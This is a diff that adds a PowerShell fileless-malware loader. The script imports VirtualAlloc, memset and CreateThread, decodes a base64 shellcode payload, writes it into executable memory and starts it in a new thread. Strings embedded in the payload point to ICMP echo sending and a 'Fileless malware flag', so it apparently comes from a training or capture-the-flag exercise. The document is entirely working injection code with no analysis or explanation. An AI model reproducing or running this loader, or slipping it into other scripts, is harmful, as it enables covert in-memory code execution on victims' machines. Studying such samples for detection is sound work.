@@ -1,0 +1,9 @@
+$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+[Byte[]]$sc = [System.Convert]::FromBase64String("6AAAAABbjbMvAgAAVo2zFwIAAFZqBWiITg0A6BUBAACNs0MCAABWjbMrAgAAVmoBaAimDADo+wAAAI2zUwIAAFb/ky8CAABQjbNgAgAAVlD/kzMCAACJg0cCAABYUI2zbwIAAFZQ/5MzAgAAiYNLAgAAWI2zfAIAAFZQ/5MzAgAAiYNPAgAA/7PRAgAAakD/kzcCAACJg9UCAADHg80CAAAQAAAAjbPNAgAAVv+z1QIAAP+TOwIAAMeDzQIAABAAAACNs80CAABWi7PVAgAAgcYQAAAAVv+TQwIAAGopagD/kzcCAACJg9kCAAD/k0cCAABQaOgDAABoKQAAAP+z2QIAAGgAAAAA/7PRAgAA/7PVAgAA/7PdAgAAUP+TSwIAAP+TTwIAAGgQJwAA/5M/AgAA67jDVYnlUVZXi00Mi3UQi30U/zb/dQjoGQAAAIkHgccEAAAAgcYEAAAA4uZfXlmJ7F3CEABVieVTVldRZP81MAAAAFiLQAyLSAyLEYtBMGoCi30IV1DoWwAAAIXAdASJ0evni0EYUItYPAHYi1h4WFABw4tLHItTIItbJAHBAcIBw4syWFABxmoB/3UMVugjAAAAhcB0CIPCBIPDAuvjWDHSZosTweICAdEDAVlfXluJ7F3CCABVieVRU1IxyTHbMdKLRQiKEIDKYAHT0eMDRRCKCITJ4O4xwItNDDnLdAFAWltZiexdwgwAhlcNAPqLNABCVQMAjr7QALwaAACOLQ0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASXBobHBhcGkuZGxsAEljbXBDcmVhdGVGaWxlAEljbXBTZW5kRWNobwBJY21wQ2xvc2VIYW5kbGUARmlsZWxlc3MgbWFsd2FyZSBmbGFnOiA2RjczRDFGNTdEQzhGMjgwRkMyRDFEMDVGQkI5MTgzQTUwREUyODYyLgAAAAAAIAAAAAAAAAAAAAAACAgICA==");
+$size = 0x1000;
+if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);
+for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
+Start-sleep 1;
+$winFunc::CreateThread(0,0,$x,0,0,0);
